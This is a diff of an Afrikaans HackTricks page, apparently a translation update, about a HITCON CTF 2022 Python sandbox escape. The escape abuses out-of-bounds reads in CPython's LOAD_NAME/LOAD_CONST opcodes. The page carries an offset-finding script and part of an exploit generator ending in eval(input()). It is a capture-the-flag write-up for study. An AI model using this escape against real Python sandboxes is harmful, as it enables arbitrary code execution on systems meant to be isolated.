@@ -1,45 +1,42 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Lees
 
+{% hint style="success" %}
+Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
+* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
 
 **Hierdie inligting is geneem** [**uit hierdie skryfstuk**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Ons kan die OOB-leesfunksie in die LOAD_NAME / LOAD_CONST opcode gebruik om 'n simbool in die geheue te kry. Dit beteken dat ons 'n truuk soos `(a, b, c, ... honderde simbole ..., __getattribute__) if [] else [].__getattribute__(...)` kan gebruik om 'n simbool (soos 'n funksienaam) te kry wat jy wil hê.
+Ons kan die OOB leesfunksie in die LOAD_NAME / LOAD_CONST opcode gebruik om 'n simbool in die geheue te kry. Dit beteken dat ons 'n truuk soos `(a, b, c, ... honderde simbole ..., __getattribute__) if [] else [].__getattribute__(...)` kan gebruik om 'n simbool (soos 'n funksienaam) te kry wat jy wil hê.
 
-Craft dan net jou uitbuit.
+Maak dan net jou aanval gereed.
 
 ### Oorsig <a href="#overview-1" id="overview-1"></a>
 
-Die bronkode is redelik kort, dit bevat slegs 4 lyne!
+Die bronkode is redelik kort, bevat slegs 4 reëls!
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-Jy kan arbitrêre Python-kode invoer en dit sal gekompileer word na 'n [Python-kode-objek](https://docs.python.org/3/c-api/code.html). Tog sal `co_consts` en `co_names` van daardie kode-objek vervang word met 'n leë tuple voordat die kode-objek geëvalueer word.
-
-Op hierdie manier kan alle uitdrukkings wat konstantes (bv. getalle, strings ens.) of name (bv. veranderlikes, funksies) bevat, uiteindelik 'n segmenteringsfout veroorsaak.
-
-### Buitegrenslees <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+### Buitengrenslees <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
 Hoe gebeur die segmenteringsfout?
 
-Laten ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan gekompileer word na die volgende bytkode.
+Laten ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan in die volgende bytekode kompileer word.
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -47,11 +44,11 @@ Laten ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan gekompileer word na
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Maar wat as die `co_names` 'n leë tuple word? Die `LOAD_NAME 2` opcode word steeds uitgevoer en probeer waarde lees vanaf daardie geheue-adres waar dit oorspronklik moes wees. Ja, dit is 'n out-of-bound lees "kenmerk".
+Maar wat as die `co_names` 'n leë tuple word? Die `LOAD_NAME 2` opcode word steeds uitgevoer, en probeer om waarde van daardie geheue-adres te lees waar dit oorspronklik moes wees. Ja, dit is 'n out-of-bound read "kenmerk".
 
-Die kernkonsep vir die oplossing is eenvoudig. Sommige opcodes in CPython, soos `LOAD_NAME` en `LOAD_CONST`, is kwesbaar (?) vir OOB-lees.
+Die kernkonsep vir die oplossing is eenvoudig. Sommige opcodes in CPython byvoorbeeld `LOAD_NAME` en `LOAD_CONST` is kwesbaar (?) vir OOB lees.
 
-Hulle haal 'n voorwerp uit die indeks `oparg` van die `consts` of `names` tuple (dit is wat `co_consts` en `co_names` onder die oppervlak genoem word). Ons kan na die volgende kort snipper oor `LOAD_CONST` verwys om te sien wat CPython doen wanneer dit die `LOAD_CONST` opcode verwerk.
+Hulle haal 'n objek van indeks `oparg` van die `consts` of `names` tuple op (dit is wat `co_consts` en `co_names` onder die oppervlak genoem word). Ons kan na die volgende kort snipper oor `LOAD_CONST` verwys om te sien wat CPython doen wanneer dit na die `LOAD_CONST` opcode verwerk.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -61,21 +58,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Op hierdie manier kan ons die OOB-funksie gebruik om 'n "naam" vanaf 'n arbitrêre geheueverskuiwing te kry. Om seker te maak watter naam dit het en watter verskuiwing dit het, bly net probeer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... En jy kan iets vind in ongeveer oparg > 700. Jy kan ook probeer om gdb te gebruik om na die geheue-uitleg te kyk, maar ek dink nie dit sal makliker wees nie?
+Op hierdie manier kan ons die OOB-funksie gebruik om 'n "naam" vanaf 'n arbitrêre geheueverskuiwing te kry. Om seker te maak watter naam dit het en wat die verskuiwing is, bly net probeer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... En jy kan iets vind met ongeveer oparg > 700. Jy kan ook probeer om gdb te gebruik om natuurlik na die geheue-indeling te kyk, maar ek dink nie dit sal makliker wees nie?
 
 ### Die Exploit Genereer <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Sodra ons daardie nuttige verskuiwings vir name / konstantes herwin het, hoe _kry_ ons 'n naam / konstante vanaf daardie verskuiwing en gebruik dit? Hier is 'n truuk vir jou:\
-Laat ons aanneem ons kan 'n `__getattribute__`-naam vanaf verskuiwing 5 (`LOAD_NAME 5`) met `co_names=()` kry, doen dan net die volgende stappe:
+Sodra ons daardie nuttige verskuiwings vir name / konstantes terugkry, hoe _kry_ ons 'n naam / konstante van daardie verskuiwing en gebruik dit? Hier is 'n truuk vir jou:\
+Laat ons aanneem ons kan 'n `__getattribute__`-naam vanaf verskuiwing 5 (`LOAD_NAME 5`) met `co_names=()` kry, doen dan net die volgende dinge:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Merk op dat dit nie nodig is om dit as `__getattribute__` te noem nie, jy kan dit 'n korter of vreemder naam gee.
+> Merk op dat dit nie nodig is om dit as `__getattribute__` te noem nie, jy kan dit noem as iets korter of vreemder
 
-Jy kan die rede daarvoor verstaan deur net na sy bytecode te kyk:
+Jy kan die rede daaragter verstaan deur net na sy bytekode te kyk:
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -92,20 +89,20 @@ Jy kan die rede daarvoor verstaan deur net na sy bytecode te kyk:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Let daarop dat `LOAD_ATTR` ook die naam uit `co_names` haal. Python laai name vanaf dieselfde offset as die naam dieselfde is, so die tweede `__getattribute__` word steeds vanaf offset=5 gelaai. Deur van hierdie kenmerk gebruik te maak, kan ons willekeurige name gebruik as die naam in die nabygeleë geheue is.
+Merk op dat `LOAD_ATTR` ook die naam uit `co_names` ophaal. Python laai name vanaf dieselfde offset as die naam dieselfde is, so die tweede `__getattribute__` word steeds gelaai vanaf offset=5. Deur hierdie kenmerk te gebruik, kan ons 'n arbitrêre naam gebruik sodra die naam in die geheue naby is.
 
-Dit behoort maklik te wees om getalle te genereer:
+Vir die genereer van getalle behoort dit triviaal te wees:
 
-* 0: nie \[\[]]
-* 1: nie \[]
-* 2: (nie \[]) + (nie \[])
+* 0: not \[\[]]
+* 1: not \[]
+* 2: (not \[]) + (not \[])
 * ...
 
-### Uitbuitingskrip <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Uitbuitingskrips <a href="#exploit-script-1" id="exploit-script-1"></a>
 
 Ek het nie konstantes gebruik as gevolg van die lengtebeperking nie.
 
-Eerstens is hier 'n krip vir ons om daardie offsette van name te vind.
+Eerstens hier is 'n skrips vir ons om daardie offsets van name te vind.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -140,7 +137,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-En die volgende is vir die genereer van die werklike Python uitbuiting.
+En die volgende is vir die skep van die werklike Python uitbuit.
 ```python
 import sys
 import unicodedata
@@ -230,16 +227,17 @@ getattr(
 '__repr__').__getattribute__('__globals__')['builtins']
 builtins['eval'](builtins['input']())
 ```
+{% hint style="success" %}
+Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
